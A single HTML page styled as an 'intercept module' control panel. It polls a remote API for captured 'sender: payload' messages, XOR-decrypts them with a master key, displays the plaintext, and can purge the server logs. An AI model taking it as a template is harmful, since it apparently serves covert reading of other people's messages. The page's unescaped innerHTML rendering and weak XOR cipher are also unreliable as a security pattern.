<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DECRYPTOR // CONTROL PANEL</title>
    <style>
        :root { --n: #00ff41; --b: #050505; --r: #ff0055; }
        * { box-sizing: border-box; }
        body { 
            background: var(--b); color: var(--n); font-family: 'Consolas', monospace; 
            margin: 0; padding: 20px; text-shadow: 0 0 5px var(--n);
        }
        header { border-bottom: 2px solid var(--n); padding-bottom: 15px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
        
        .stats { font-size: 14px; color: #fff; background: rgba(0,255,65,0.1); padding: 5px 15px; border: 1px solid var(--n); }
        .master-key { background: #000; border: 1px solid var(--r); color: var(--r); padding: 10px; width: 250px; outline: none; font-family: inherit; }
        
        #purge-btn { background: var(--r); color: #000; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
        #purge-btn:hover { background: #ff4488; }

        table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 13px; }
        th { border: 1px solid var(--n); padding: 10px; background: rgba(0, 255, 65, 0.1); text-align: left; }
        td { border: 1px solid rgba(0, 255, 65, 0.3); padding: 10px; word-break: break-all; }
        
        .cipher-box { color: #888; font-size: 11px; }
        .plain-box { color: #fff; font-weight: bold; background: rgba(255,255,255,0.05); }
    </style>
</head>
<body>

    <header>
        <div>
            <div>[ INTERCEPT_MODULE_V1.2 ]</div>
            <div id="counter" class="stats" style="margin-top:5px;">MESSAGES_CAPTURED: 0</div>
        </div>
        <input type="text" id="m-key" class="master-key" placeholder="MASTER_DECRYPT_KEY">
        <button id="purge-btn" onclick="clearLogs()">! PURGE_ALL_LOGS !</button>
    </header>

    <table id="data-table">
        <thead>
            <tr>
                <th>SENDER</th>
                <th>ENCRYPTED (BASE64)</th>
                <th>DECRYPTED_RESULT</th>
            </tr>
        </thead>
        <tbody id="logs"></tbody>
    </table>

<script>
    const API = 'https://control-u6bq.onrender.com/api';
    const logs = document.getElementById('logs');
    const masterKey = document.getElementById('m-key');
    const counter = document.getElementById('counter');

    function crypt(t, k) {
        if (!k) return t;
        const te = new TextEncoder().encode(t);
        const ke = new TextEncoder().encode(k);
        return String.fromCharCode(...te.map((b, i) => b ^ ke[i % ke.length]));
    }

    async function clearLogs() {
        if(confirm("DANGER: WIPE ALL MESSAGES FROM SERVER?")) {
            await fetch(API, { method: 'DELETE' });
            update();
        }
    }

    async function update() {
        try {
            const r = await fetch(API);
            const data = await r.text();
            const lines = data.split('\n').filter(l => l.trim());
            const key = masterKey.value;

            counter.innerText = `MESSAGES_CAPTURED: ${lines.length}`;
            logs.innerHTML = ""; 

            lines.forEach((line) => {
                if (line.includes(": ")) {
                    let [user, payload] = [line.split(": ")[0], line.split(": ").slice(1).join(": ")];
                    let dec = "---";
                    try {
                        dec = decodeURIComponent(crypt(atob(payload), key));
                    } catch(e) { dec = "[INVALID_KEY]"; }

                    const tr = document.createElement('tr');
                    tr.innerHTML = `
                        <td><strong>${user}</strong></td>
                        <td class="cipher-box">${payload}</td>
                        <td class="plain-box">${dec}</td>
                    `;
                    logs.appendChild(tr);
                }
            });
        } catch(e) {}
    }

    masterKey.oninput = update;
    setInterval(update, 3000);
    update();
</script>
</body>
</html>
